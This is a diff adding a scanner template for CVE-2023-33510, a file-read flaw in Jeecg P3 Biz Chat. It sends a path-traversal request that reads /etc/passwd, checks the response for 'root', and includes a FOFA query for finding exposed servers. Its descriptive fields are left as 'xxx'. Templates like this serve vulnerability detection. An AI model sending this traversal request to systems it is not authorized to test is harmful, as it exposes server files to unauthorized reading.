@@ -1,0 +1,29 @@
+id: CVE-2023-33510
+info:
+  name: Jeecg P3 Biz Chat 任意文件读取漏洞(CVE-2023-33510)
+  author: mike
+  severity: info
+  description: xxx
+  reference: xxx
+  remediation: xxx
+  metadata:
+    max-request: 1
+    verified: true
+    fofa-query: icon_hash="1380908726"
+http:
+  - raw:
+      - |
+        GET /chat/imController/showOrDownByurl.do?dbPath=../../../../../../etc/passwd HTTP/1.1
+        Host: {{Hostname}}  
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Connection: close
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "root"
